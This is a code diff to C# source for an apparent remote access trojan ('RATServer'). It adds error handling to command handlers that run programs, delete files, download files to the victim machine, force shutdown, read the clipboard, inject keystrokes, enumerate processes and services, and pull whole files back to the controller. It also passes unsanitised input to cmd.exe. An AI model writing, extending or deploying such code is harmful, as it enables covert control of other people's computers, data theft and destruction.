@@ -15,125 +15,162 @@ namespace RATServer
     {
         public static Response Message(string Msg)
         {
-            Response r = new Response();
-            MessageBox.Show(Msg);
-            r.Type = "Message";
-            r.Msg = "Message Success";
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                MessageBox.Show(Msg);
+                r.Msg = "Message Success";
+            } catch (Exception e) { r.Msg = e.Message; }          
             return r;
         }
         public static Response Run(string Path)
         {
-            Response r = new Response();
-            Process.Start(Path);
-            r.Type = "Message";
-            r.Msg = "Run Success";
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                Process.Start(Path);        
+                r.Msg = "Run Success";
+            } catch (Exception e) { r.Msg = e.Message; }            
             return r;
         }
         public static Response PCInfo()
         {
-            Response r = new Response();
-            r.Type = "Message";
-            r.Msg = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                r.Msg = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
+            }
+            catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
         public static Response Processes()
         {
-            Response r = new Response();
-            r.Type = "Message";
-            foreach (Process p in Process.GetProcesses()) r.Msg += p.ProcessName + Environment.NewLine;
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                foreach (Process p in Process.GetProcesses()) r.Msg += p.ProcessName + Environment.NewLine;
+            }
+            catch (Exception e) { r.Msg = e.Message; }          
             return r;
         }
         public static Response Delete(string Path)
         {
-            Response r = new Response();
-            r.Type = "Message";
-            if (File.Exists(Path))
+            Response r = new Response { Type = "Message" };
+            try
             {
-                File.Delete(Path);
-                r.Msg = "Delete Success";
-            } else r.Msg = "File Not Found";
+                if (File.Exists(Path))
+                {
+                    File.Delete(Path);
+                    r.Msg = "Delete Success";
+                } else r.Msg = "File Not Found";
+            }
+            catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
         public static Response Download(string IP, string Path)
         {
-            Response r = new Response();
-            r.Type = "Message";
-            using (var c = new WebClient())
+            Response r = new Response { Type = "Message" };
+            try
             {
-                c.DownloadFile(IP, Path);
+                using (var c = new WebClient()) c.DownloadFile(IP, Path);
+                r.Msg = "Download Success";
             }
-            r.Msg = "Download Success";
+            catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
         public static Response ShutDown()
         {
-            Response r = new Response();
-            r.Type = "Message";
-            Process.Start("cmd.exe shutdown -s -f -t 00");
-            r.Msg = "Shutdown Success";
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                Process.Start("cmd.exe shutdown -s -f -t 00");
+                r.Msg = "Shutdown Success";
+            }
+            catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
         public static Response ClipBoard()
         {
-            Response r = new Response();
-            r.Type = "Message";
-            r.Msg = Clipboard.GetText();
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                r.Msg = Clipboard.GetText();
+            }
+            catch (Exception e) { r.Msg = e.Message; }          
             return r;
         }
         public static Response KeyPress(string Keys)
         {
-            Response r = new Response();
-            r.Type = "Message";
-            SendKeys.SendWait(Keys);
-            r.Msg = "SendKeys Success";
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                SendKeys.SendWait(Keys);
+                r.Msg = "SendKeys Success";                
+            }
+            catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
         public static Response Retrieve(string Dir)
         {
             //issues with large files likely due to predetermined connection buffer size
-            Response r = new Response();
-            r.Type = "Data";
-            r.Msg = Path.GetFileName(Dir);
-            r.Data = File.ReadAllBytes(Dir);
+            Response r = new Response { Type = "Data" };
+            try
+            {
+                r.Msg = Path.GetFileName(Dir);
+                r.Data = File.ReadAllBytes(Dir);
+            }
+            catch (Exception e) { r.Msg = e.Message; r.Data = new byte[0]; }
             return r;
         }
         public static Response Services()
         {
-            Response r = new Response();
-            r.Type = "Message";
-            ServiceController[] sc = ServiceController.GetServices();
-            foreach (ServiceController s in sc) r.Msg += s.DisplayName + Environment.NewLine;
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                ServiceController[] sc = ServiceController.GetServices();
+                foreach (ServiceController s in sc) r.Msg += s.DisplayName + Environment.NewLine;
+            }
+            catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
         public static Response Search(string Path)
         {
-            Response r = new Response();
-            r.Type = "Message";
-            Process p = new Process();
-            p.StartInfo.UseShellExecute = false;
-            p.StartInfo.RedirectStandardOutput = true;
-            p.StartInfo.FileName = "cmd.exe";
-            p.StartInfo.Arguments = "/c dir " + Path;
-            p.Start();
-            r.Msg = p.StandardOutput.ReadToEnd();
-            p.WaitForExit();
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                Process p = new Process();
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.Arguments = "/c dir " + Path;
+                p.Start();
+                r.Msg = p.StandardOutput.ReadToEnd();
+                p.WaitForExit();
+            }
+            catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
         public static Response ScreenShot()
         {
             //work in progress
-            Response r = new Response();
-            r.Type = "Data";
-            //r.Msg = filename;
-            //r.Data = data;
+            Response r = new Response { Type = "Data" };
+            try
+            {
+                //r.Msg = filename;
+                //r.Data = data;
+            }
+            catch (Exception e) { r.Msg = e.Message; r.Data = new byte[0]; }
             return r;
         }
         public static Response Applications()
         {
             //work in progress
-            Response r = new Response();
-            r.Type = "Message";
-            r.Msg = "Applications";
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                r.Msg = "ApplicationsList";
+            }
+            catch (Exception e) { r.Msg = e.Message; }        
             return r;
         }
     }
